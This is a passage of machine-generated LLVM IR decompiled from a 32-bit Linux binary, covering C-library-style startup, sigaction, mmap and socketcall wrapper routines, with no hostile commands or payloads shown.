  %v4_8054a4d = call i32 @function_8052abd(i32 %v0_8054a46, i32 1, i32 %tmp6)
  %v8_8054a55 = icmp eq i32 %v4_8054a4d, -1
  %v1_8054a56 = icmp eq i1 %v8_8054a55, false
  br i1 %v1_8054a56, label %dec_label_pc_8054a71, label %dec_label_pc_8054a58

dec_label_pc_8054a58:                             ; preds = %dec_label_pc_8054a41
  %v0_8054a5a = load i32, i32* @ebx, align 4
  %v6_8054a60 = call i32 @function_8052c92(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055e4c.237, i32 0, i32 0), i32 %v0_8054a5a)
  %v1_8054a68 = load i32, i32* @esi, align 4
  %v12_8054a68 = icmp eq i32 %v6_8054a60, %v1_8054a68
  br i1 %v12_8054a68, label %dec_label_pc_8054a71, label %dec_label_pc_8054a6c

dec_label_pc_8054a6c:                             ; preds = %dec_label_pc_8054a58
  %v0_8054a6c = call i32 @function_8054475()
  br label %dec_label_pc_8054a71

dec_label_pc_8054a71:                             ; preds = %dec_label_pc_8054a58, %dec_label_pc_8054a41, %dec_label_pc_8054a6c
  %v2_8054a71 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8054a42, i32* @ebx, align 4
  store i32 %v0_8054a41, i32* @esi, align 4
  ret i32 %v2_8054a71

; uselistorder directives
  uselistorder i32 ()* @function_8054475, { 3, 2, 1, 4, 0 }
  uselistorder i32 (i8*, i32)* @function_8052c92, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @function_8052abd, { 4, 5, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a71, { 2, 0, 1 }
}

define i32 @function_8054a75() local_unnamed_addr {
dec_label_pc_8054a75:
  %v0_8054a78 = load i8, i8* @global_var_80572d0.238, align 16
  %v1_8054a78 = icmp eq i8 %v0_8054a78, 0
  %v1_8054a7f = icmp eq i1 %v1_8054a78, false
  br i1 %v1_8054a7f, label %dec_label_pc_8054a75.dec_label_pc_8054ab1_crit_edge, label %dec_label_pc_8054a81

dec_label_pc_8054a75.dec_label_pc_8054ab1_crit_edge: ; preds = %dec_label_pc_8054a75
  %v0_8054ab4.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8054ab1

dec_label_pc_8054a81:                             ; preds = %dec_label_pc_8054a75
  store i8 1, i8* @global_var_80572d0.238, align 16
  store i32 4096, i32* @global_var_80572c4.239, align 4
  br label %dec_label_pc_8054ab1

dec_label_pc_8054ab1:                             ; preds = %dec_label_pc_8054a75.dec_label_pc_8054ab1_crit_edge, %dec_label_pc_8054a81
  %v0_8054ab4 = phi i32 [ %v0_8054ab4.pre, %dec_label_pc_8054a75.dec_label_pc_8054ab1_crit_edge ], [ 0, %dec_label_pc_8054a81 ]
  ret i32 %v0_8054ab4

; uselistorder directives
  uselistorder i8 1, { 11, 1, 12, 4, 5, 6, 2, 3, 8, 0, 13, 14, 15, 16, 7, 10, 9 }
  uselistorder i8* @global_var_80572d0.238, { 1, 0 }
  uselistorder label %dec_label_pc_8054ab1, { 1, 0 }
}

define i32 @function_8054ab5(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054ab5:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80572bc.240, align 4
  store i32 %arg6, i32* @global_var_80572cc.236, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_8054aec = mul i32 %arg2, 4
  %v3_8054aec = add i32 %tmp44, %v2_8054aec
  store i32 %v3_8054aec, i32* %edx.global-to-local, align 4
  %v1_8054aef = add i32 %v3_8054aec, 4
  store i32 %v1_8054aef, i32* @global_var_80572c0.241, align 64
  %v3_8054af7 = load i32, i32* %arg3, align 4
  %v14_8054af7 = icmp eq i32 %v1_8054aef, %v3_8054af7
  %v1_8054af9 = icmp eq i1 %v14_8054af7, false
  br i1 %v1_8054af9, label %dec_label_pc_8054b01, label %dec_label_pc_8054afb

dec_label_pc_8054afb:                             ; preds = %dec_label_pc_8054ab5
  store i32 %v3_8054aec, i32* @global_var_80572c0.241, align 64
  br label %dec_label_pc_8054b01

dec_label_pc_8054b01:                             ; preds = %dec_label_pc_8054ab5, %dec_label_pc_8054afb
  %v0_8054b01 = load i32, i32* @ecx, align 4
  store i32 %v0_8054b01, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8054b06 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8054b0b = bitcast i32* %stack_var_-136 to i8*
  %v4_8054b0b = call i32 @function_805310a(i8* %v3_8054b0b, i32 0, i32 120)
  %v0_8054b10 = load i32, i32* @global_var_80572c0.241, align 64
  br label %dec_label_pc_8054b18

dec_label_pc_8054b18:                             ; preds = %dec_label_pc_8054b18, %dec_label_pc_8054b01
  %v0_8054b18 = phi i32 [ %v1_8054b1b, %dec_label_pc_8054b18 ], [ %v0_8054b10, %dec_label_pc_8054b01 ]
  %v1_8054b18 = inttoptr i32 %v0_8054b18 to i32*
  %v2_8054b18 = load i32, i32* %v1_8054b18, align 4
  %v3_8054b18 = icmp eq i32 %v2_8054b18, 0
  %v1_8054b1b = add i32 %v0_8054b18, 4
  %v1_8054b1e = icmp eq i1 %v3_8054b18, false
  br i1 %v1_8054b1e, label %dec_label_pc_8054b18, label %dec_label_pc_8054b3f.preheader

dec_label_pc_8054b3f.preheader:                   ; preds = %dec_label_pc_8054b18
  store i32 %v1_8054b1b, i32* @ebx, align 4
  %v1_8054b3f22 = inttoptr i32 %v1_8054b1b to i32*
  %v2_8054b3f23 = load i32, i32* %v1_8054b3f22, align 4
  %v3_8054b3f24 = icmp eq i32 %v2_8054b3f23, 0
  %v1_8054b4226 = icmp eq i1 %v3_8054b3f24, false
  br i1 %v1_8054b4226, label %dec_label_pc_8054b24.lr.ph, label %dec_label_pc_8054b44

dec_label_pc_8054b24.lr.ph:                       ; preds = %dec_label_pc_8054b3f.preheader
  %v3_8054b04 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8054b2f = add i32 %v3_8054b04, 32
  br label %dec_label_pc_8054b24

dec_label_pc_8054b24:                             ; preds = %dec_label_pc_8054b24.lr.ph, %dec_label_pc_8054b3c
  %v1_8054b2f = phi i32 [ %v2_8054b3f23, %dec_label_pc_8054b24.lr.ph ], [ %v2_8054b3f, %dec_label_pc_8054b3c ]
  %v0_8054b2e = phi i32 [ %v1_8054b1b, %dec_label_pc_8054b24.lr.ph ], [ %v1_8054b3c, %dec_label_pc_8054b3c ]
  %v6_8054b29 = icmp ugt i32 %v1_8054b2f, 14
  br i1 %v6_8054b29, label %dec_label_pc_8054b3c, label %dec_label_pc_8054b2b

dec_label_pc_8054b2b:                             ; preds = %dec_label_pc_8054b24
  %v0_8054b2b = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8054b2b, i32* %stack_var_-160, align 4
  store i32 %v0_8054b2e, i32* %stack_var_-168, align 4
  %v2_8054b2f = mul i32 %v1_8054b2f, 8
  %v4_8054b2f = add i32 %v3_8054b2f, %v2_8054b2f
  %v3_8054b34 = inttoptr i32 %v4_8054b2f to i16*
  %v4_8054b34 = call i32 @function_8055302(i16* %v3_8054b34, i32 %v0_8054b2e, i32 8)
  %v0_8054b3c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054b3c

dec_label_pc_8054b3c:                             ; preds = %dec_label_pc_8054b24, %dec_label_pc_8054b2b
  %v0_8054b3c = phi i32 [ %v0_8054b2e, %dec_label_pc_8054b24 ], [ %v0_8054b3c.pre, %dec_label_pc_8054b2b ]
  %v1_8054b3c = add i32 %v0_8054b3c, 8
  store i32 %v1_8054b3c, i32* @ebx, align 4
  %v1_8054b3f = inttoptr i32 %v1_8054b3c to i32*
  %v2_8054b3f = load i32, i32* %v1_8054b3f, align 4
  %v3_8054b3f = icmp eq i32 %v2_8054b3f, 0
  %v1_8054b42 = icmp eq i1 %v3_8054b3f, false
  br i1 %v1_8054b42, label %dec_label_pc_8054b24, label %dec_label_pc_8054b44

dec_label_pc_8054b44:                             ; preds = %dec_label_pc_8054b3c, %dec_label_pc_8054b3f.preheader
  store i32 %v2_8054b06, i32* @eax, align 4
  %v0_8054b48 = call i32 @function_80553bd()
  store i32 %v0_8054b48, i32* @eax, align 4
  %v0_8054b4d = call i32 @function_8054a75()
  %v1_8054b56 = icmp eq i32 %tmp39, 0
  %v1_8054b58 = icmp eq i1 %v1_8054b56, false
  br i1 %v1_8054b58, label %dec_label_pc_8054b5e, label %dec_label_pc_8054b5a

dec_label_pc_8054b5a:                             ; preds = %dec_label_pc_8054b44
  %v1_8054b5a = and i32 %tmp39, -65536
  %v2_8054b5a = or i32 %v1_8054b5a, 4096
  br label %dec_label_pc_8054b5e

dec_label_pc_8054b5e:                             ; preds = %dec_label_pc_8054b44, %dec_label_pc_8054b5a
  %v0_8054b5e = phi i32 [ %tmp39, %dec_label_pc_8054b44 ], [ %v2_8054b5a, %dec_label_pc_8054b5a ]
  store i32 %v0_8054b5e, i32* @global_var_80572c4.239, align 4
  %v13_8054b63 = icmp eq i32 %tmp38, -1
  %v1_8054b68 = icmp eq i1 %v13_8054b63, false
  br i1 %v1_8054b68, label %dec_label_pc_8054b93, label %dec_label_pc_8054b6a

dec_label_pc_8054b6a:                             ; preds = %dec_label_pc_8054b5e
  %v0_8054b6a = call i32 @function_80550e1()
  store i32 %v0_8054b6a, i32* @ebx, align 4
  %v0_8054b71 = call i32 @function_8055050()
  %v0_8054b76 = load i32, i32* @ebx, align 4
  %v12_8054b76 = icmp eq i32 %v0_8054b76, %v0_8054b71
  %v1_8054b78 = icmp eq i1 %v12_8054b76, false
  br i1 %v1_8054b78, label %dec_label_pc_8054ba9, label %dec_label_pc_8054b7a

dec_label_pc_8054b7a:                             ; preds = %dec_label_pc_8054b6a
  %v0_8054b7a = call i32 @function_8055076()
  store i32 %v0_8054b7a, i32* @ebx, align 4
  %v0_8054b81 = call i32 @function_805502a()
  %v0_8054b86 = load i32, i32* @ebx, align 4
  %v12_8054b86 = icmp eq i32 %v0_8054b86, %v0_8054b81
  %v1_8054b88 = icmp eq i1 %v12_8054b86, false
  br i1 %v1_8054b88, label %dec_label_pc_8054ba9, label %dec_label_pc_8054b8a.thread

dec_label_pc_8054b8a.thread:                      ; preds = %dec_label_pc_8054b7a
  br label %dec_label_pc_8054bd3

dec_label_pc_8054b93:                             ; preds = %dec_label_pc_8054b5e
  %v15_8054b93 = icmp eq i32 %tmp38, %tmp37
  %v1_8054b97 = icmp eq i1 %v15_8054b93, false
  br i1 %v1_8054b97, label %dec_label_pc_8054ba9, label %dec_label_pc_8054b99

dec_label_pc_8054b99:                             ; preds = %dec_label_pc_8054b93
  br label %dec_label_pc_8054ba9

dec_label_pc_8054ba9:                             ; preds = %dec_label_pc_8054b99, %dec_label_pc_8054b93, %dec_label_pc_8054b7a, %dec_label_pc_8054b6a
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8054bb0 = call i32 @function_8054a41()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8054bbf = call i32 @function_8054a41()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8054bce = call i32 @function_8054a41()
  br label %dec_label_pc_8054bd3

dec_label_pc_8054bd3:                             ; preds = %dec_label_pc_8054b8a.thread, %dec_label_pc_8054ba9
  store i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32* %esi.global-to-local, align 4
  %v0_8054bd8 = load i32, i32* @edi, align 4
  %v1_8054bd8 = inttoptr i32 %v0_8054bd8 to i32*
  %v2_8054bd8 = load i32, i32* %v1_8054bd8, align 4
  store i32 %v2_8054bd8, i32* bitcast (i32** @global_var_80571e8.243 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32 -134574436), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80572c8.235, align 8
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32 -134574436), i32 2), i32 0), label %dec_label_pc_8054bf8, label %dec_label_pc_8054c04

dec_label_pc_8054bf8:                             ; preds = %dec_label_pc_8054bd3, %dec_label_pc_8054bf8
  %v4_8054bf8 = phi i32 [ %v1_8054bff, %dec_label_pc_8054bf8 ], [ 0, %dec_label_pc_8054bd3 ]
  store i32 ptrtoint (i32* @global_var_8054bff.244 to i32), i32* %stack_var_-160, align 4
  %v5_8054bf8 = mul i32 %v4_8054bf8, 4
  %v6_8054bf8 = add i32 %v5_8054bf8, ptrtoint (i32* @global_var_8057164.233 to i32)
  %v7_8054bf8 = inttoptr i32 %v6_8054bf8 to i32*
  %v8_8054bf8 = load i32, i32* %v7_8054bf8, align 4
  call void @__pseudo_call(i32 %v8_8054bf8)
  %v0_8054bff = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054bff = add i32 %v0_8054bff, 1
  store i32 %v1_8054bff, i32* %ebx.global-to-local, align 4
  %v1_8054c00 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054c00 = icmp ult i32 %v1_8054bff, %v1_8054c00
  br i1 %v7_8054c00, label %dec_label_pc_8054bf8, label %dec_label_pc_8054c04

dec_label_pc_8054c04:                             ; preds = %dec_label_pc_8054bf8, %dec_label_pc_8054bd3
  store i32 134564874, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32 -134574436), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32 -134574436), i32 2), i32 0), label %dec_label_pc_8054c1c, label %dec_label_pc_8054c28

dec_label_pc_8054c1c:                             ; preds = %dec_label_pc_8054c04, %dec_label_pc_8054c1c
  %v4_8054c1c = phi i32 [ %v1_8054c23, %dec_label_pc_8054c1c ], [ 0, %dec_label_pc_8054c04 ]
  store i32 ptrtoint (i32* @global_var_8054c23.245 to i32), i32* %stack_var_-160, align 4
  %v5_8054c1c = mul i32 %v4_8054c1c, 4
  %v6_8054c1c = add i32 %v5_8054c1c, ptrtoint (i32* @global_var_8057164.233 to i32)
  %v7_8054c1c = inttoptr i32 %v6_8054c1c to i32*
  %v8_8054c1c = load i32, i32* %v7_8054c1c, align 4
  call void @__pseudo_call(i32 %v8_8054c1c)
  %v0_8054c23 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054c23 = add i32 %v0_8054c23, 1
  store i32 %v1_8054c23, i32* %ebx.global-to-local, align 4
  %v1_8054c24 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054c24 = icmp ult i32 %v1_8054c23, %v1_8054c24
  br i1 %v7_8054c24, label %dec_label_pc_8054c1c, label %dec_label_pc_8054c28

dec_label_pc_8054c28:                             ; preds = %dec_label_pc_8054c1c, %dec_label_pc_8054c04
  %v0_8054c31 = load i32, i32* %stack_var_-160, align 4
  %v1_8054c31 = call i32 @function_80530b9(i32 %v0_8054c31)
  %v1_8054c36 = inttoptr i32 %v1_8054c31 to i32*
  store i32 0, i32* %v1_8054c36, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v0_8054c57 = load i32, i32* @edi, align 4
  store i32 %v0_8054c57, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8054c66 = load i32, i32* @eax, align 4
  %v1_8054c69 = call i32 @function_80546c9(i32 %v0_8054c66)
  %v0_8054c75 = load i32, i32* @ebx, align 4
  %v1_8054c75 = inttoptr i32 %v0_8054c75 to %sigcontext*
  %v2_8054c75 = call i32 @sigreturn(%sigcontext* %v1_8054c75)
  %v0_8054c7d = load i32, i32* @ebx, align 4
  %v1_8054c7d = inttoptr i32 %v0_8054c7d to %sigcontext*
  %v2_8054c7d = call i32 @sigreturn(%sigcontext* %v1_8054c7d)
  ret i32 %v2_8054c7d

; uselistorder directives
  uselistorder i32 %v1_8054c23, { 1, 2, 0 }
  uselistorder i32 %v1_8054bff, { 1, 2, 0 }
  uselistorder i32 %v2_8054b3f, { 1, 0 }
  uselistorder i32 %v1_8054b3c, { 2, 1, 0 }
  uselistorder i32 %v1_8054b1b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8054b18, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_80546c9, { 0, 2, 1 }
  uselistorder i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32 -134574436), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8057164.233 to i32), i32 -134574436), i32 2), { 1, 3, 4, 2, 0 }
  uselistorder i32 ()* @function_8054a41, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 120, { 8, 22, 1, 2, 9, 10, 3, 11, 12, 13, 4, 5, 14, 15, 6, 16, 17, 7, 18, 19, 20, 21, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_8054c1c, { 1, 0 }
  uselistorder label %dec_label_pc_8054bf8, { 1, 0 }
  uselistorder label %dec_label_pc_8054bd3, { 1, 0 }
  uselistorder label %dec_label_pc_8054b5e, { 1, 0 }
  uselistorder label %dec_label_pc_8054b3c, { 1, 0 }
  uselistorder label %dec_label_pc_8054b24, { 1, 0 }
  uselistorder label %dec_label_pc_8054b01, { 1, 0 }
}

define i32 @function_8054c7f(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8054c7f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8054c7f = load i32, i32* @esi, align 4
  %v0_8054c80 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054c95 = icmp eq i32* %arg2, null
  br i1 %v1_8054c95, label %dec_label_pc_8054ce8, label %dec_label_pc_8054c99

dec_label_pc_8054c99:                             ; preds = %dec_label_pc_8054c7f
  %v2_8054c99 = load i32, i32* %arg2, align 4
  store i32 %v2_8054c99, i32* %stack_var_-148, align 4
  %v1_8054ca2 = add i32 %tmp11, 4
  %v3_8054cb4 = bitcast i32* %stack_var_-136 to i16*
  %v4_8054cb4 = call i32 @function_8055302(i16* %v3_8054cb4, i32 %v1_8054ca2, i32 128)
  %v1_8054cb9 = add i32 %tmp11, 132
  %v2_8054cd3 = inttoptr i32 %v1_8054cb9 to i8*
  %v3_8054cd3 = load i8, i8* %v2_8054cd3, align 1
  %v4_8054cd3 = and i8 %v3_8054cd3, 4
  %v5_8054cd3 = icmp eq i8 %v4_8054cd3, 0
  %v1_8054cda = icmp eq i1 %v5_8054cd3, false
  br i1 %v1_8054cda, label %dec_label_pc_8054ce8, label %dec_label_pc_8054cdc

dec_label_pc_8054cdc:                             ; preds = %dec_label_pc_8054c99
  br label %dec_label_pc_8054ce8

dec_label_pc_8054ce8:                             ; preds = %dec_label_pc_8054cdc, %dec_label_pc_8054c99, %dec_label_pc_8054c7f
  %v1_8054cea = icmp eq i32 %arg3, 0
  br i1 %v1_8054cea, label %dec_label_pc_8054cf2, label %dec_label_pc_8054cee

dec_label_pc_8054cee:                             ; preds = %dec_label_pc_8054ce8
  %v2_8054cee = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8054cf2

dec_label_pc_8054cf2:                             ; preds = %dec_label_pc_8054ce8, %dec_label_pc_8054cee
  %v0_8054d01 = phi i32 [ 0, %dec_label_pc_8054ce8 ], [ %v2_8054cee, %dec_label_pc_8054cee ]
  br i1 %v1_8054c95, label %dec_label_pc_8054cff, label %dec_label_pc_8054cf8

dec_label_pc_8054cf8:                             ; preds = %dec_label_pc_8054cf2
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_8054cff

dec_label_pc_8054cff:                             ; preds = %dec_label_pc_8054cf2, %dec_label_pc_8054cf8
  %v0_8054d02 = phi %sigaction* [ null, %dec_label_pc_8054cf2 ], [ %phitmp, %dec_label_pc_8054cf8 ]
  %v5_8054d0a = call i32 @function_8054da5(i32 %arg1, %sigaction* %v0_8054d02, i32 %v0_8054d01, i32 8)
  store i32 %v5_8054d0a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8054cea, label %dec_label_pc_8054d4d, label %dec_label_pc_8054d18

dec_label_pc_8054d18:                             ; preds = %dec_label_pc_8054cff
  %v2_8054d18 = icmp slt i32 %v5_8054d0a, 0
  br i1 %v2_8054d18, label %dec_label_pc_8054d4d, label %dec_label_pc_8054d1c

dec_label_pc_8054d1c:                             ; preds = %dec_label_pc_8054d18
  %v3_8054d1c = load i32, i32* %stack_var_-288, align 4
  %v2_8054d20 = inttoptr i32 %arg3 to i32*
  store i32 %v3_8054d1c, i32* %v2_8054d20, align 4
  %v2_8054d28 = ptrtoint i32* %stack_var_-276 to i32
  %v1_8054d2d = add i32 %arg3, 4
  %v3_8054d31 = inttoptr i32 %v1_8054d2d to i16*
  %v4_8054d31 = call i32 @function_8055302(i16* %v3_8054d31, i32 %v2_8054d28, i32 128)
  %v2_8054d3a = add i32 %arg3, 132
  %v3_8054d3a = inttoptr i32 %v2_8054d3a to i32*
  %v2_8054d47 = add i32 %arg3, 136
  %v3_8054d47 = inttoptr i32 %v2_8054d47 to i32*
  %v0_8054d4d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d4d

dec_label_pc_8054d4d:                             ; preds = %dec_label_pc_8054d18, %dec_label_pc_8054cff, %dec_label_pc_8054d1c
  %v0_8054d4d = phi i32 [ %v5_8054d0a, %dec_label_pc_8054d18 ], [ %v5_8054d0a, %dec_label_pc_8054cff ], [ %v0_8054d4d.pre, %dec_label_pc_8054d1c ]
  store i32 %v0_8054c80, i32* @ebx, align 4
  store i32 %v0_8054c7f, i32* @esi, align 4
  ret i32 %v0_8054d4d

; uselistorder directives
  uselistorder i32 %v5_8054d0a, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 0, 2 }
  uselistorder i8 4, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32 132, { 1, 2, 0, 3 }
  uselistorder i32 128, { 6, 7, 11, 8, 10, 0, 1, 2, 3, 4, 5, 9 }
  uselistorder i32* null, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 2, 1, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8054d4d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054cff, { 1, 0 }
  uselistorder label %dec_label_pc_8054cf2, { 1, 0 }
}

define i32 @function_8054d58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054d58:
  %stack_var_4 = alloca i32, align 4
  %v0_8054d58 = load i32, i32* @ebx, align 4
  store i32 %v0_8054d58, i32* @edx, align 4
  %v2_8054d63 = load i32, i32* @ecx, align 4
  %v4_8054d63 = load i32, i32* @esi, align 4
  %v5_8054d63 = load i32, i32* @edi, align 4
  %v6_8054d63 = load i32, i32* @ebp, align 4
  %v7_8054d63 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8054d63, i32 %v0_8054d58, i32 %v4_8054d63, i32 %v5_8054d63, i32 %v6_8054d63)
  %v8_8054d63 = ptrtoint i32* %v7_8054d63 to i32
  store i32 %v0_8054d58, i32* @ebx, align 4
  %v3_8054d6c = icmp ugt i32* %v7_8054d63, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8054d6c, i32 134566917)
  ret i32 %v8_8054d63

; uselistorder directives
  uselistorder i32* @ebp, { 7, 68, 69, 70, 71, 72, 73, 74, 75, 32, 33, 34, 35, 76, 77, 78, 79, 80, 81, 82, 83, 88, 84, 85, 86, 87, 6, 89, 10, 2, 21, 22, 11, 29, 15, 8, 14, 16, 18, 1, 23, 9, 0, 28, 12, 13, 17, 19, 20, 24, 25, 26, 27, 30, 31, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 3, 47, 48, 49, 50, 4, 51, 52, 53, 54, 55, 56, 57, 58, 59, 5, 60, 61, 62, 63, 64, 65, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 110, 108, 109, 111, 112, 113, 114, 115, 66, 67 }
  uselistorder i32* @ecx, { 5, 19, 17, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 1, 45, 21, 20, 18, 46, 47, 48, 2, 49, 50, 51, 3, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 7, 8, 4, 9, 10, 11, 63, 12, 13, 14, 15, 16, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 6, 89, 90, 91, 92, 93 }
}

define i32 @function_8054d73(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054d73:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054d73 = load i32, i32* @ebx, align 4
  store i32 %v0_8054d73, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054d86 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054d86, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8054d86, -4095
  br i1 %tmp9, label %dec_label_pc_8054d9f, label %dec_label_pc_8054d93

dec_label_pc_8054d93:                             ; preds = %dec_label_pc_8054d73
  %v1_8054d93 = call i32 @function_80530b9(i32 %v0_8054d73)
  %v0_8054d98 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054d98 = sub i32 0, %v0_8054d98
  %v2_8054d9a = inttoptr i32 %v1_8054d93 to i32*
  store i32 %v1_8054d98, i32* %v2_8054d9a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054da3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8054d9f

dec_label_pc_8054d9f:                             ; preds = %dec_label_pc_8054d73, %dec_label_pc_8054d93
  %v2_8054da3 = phi i32 [ %v0_8054d73, %dec_label_pc_8054d73 ], [ %v2_8054da3.pre, %dec_label_pc_8054d93 ]
  %v0_8054d9f = phi i32 [ %v1_8054d86, %dec_label_pc_8054d73 ], [ -1, %dec_label_pc_8054d93 ]
  %v2_8054da1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054da1, i32* @edx, align 4
  store i32 %v2_8054da3, i32* @ebx, align 4
  ret i32 %v0_8054d9f

; uselistorder directives
  uselistorder i32 %v1_8054d86, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8054d9f, { 1, 0 }
}

define i32 @function_8054da5(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054da5:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8054da6 = load i32, i32* @esi, align 4
  store i32 %v0_8054da6, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8054dba = load i32, i32* @ebx, align 4
  %v7_8054dc2 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8054dc2, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8054dc2, -4095
  br i1 %tmp14, label %dec_label_pc_8054dda, label %dec_label_pc_8054dce

dec_label_pc_8054dce:                             ; preds = %dec_label_pc_8054da5
  %v1_8054dce = call i32 @function_80530b9(i32 %v0_8054dba)
  %v0_8054dd3 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054dd3 = sub i32 0, %v0_8054dd3
  %v2_8054dd5 = inttoptr i32 %v1_8054dce to i32*
  store i32 %v1_8054dd3, i32* %v2_8054dd5, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8054ddd.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054dda

dec_label_pc_8054dda:                             ; preds = %dec_label_pc_8054da5, %dec_label_pc_8054dce
  %v2_8054ddd = phi i32 [ %v0_8054da6, %dec_label_pc_8054da5 ], [ %v2_8054ddd.pre, %dec_label_pc_8054dce ]
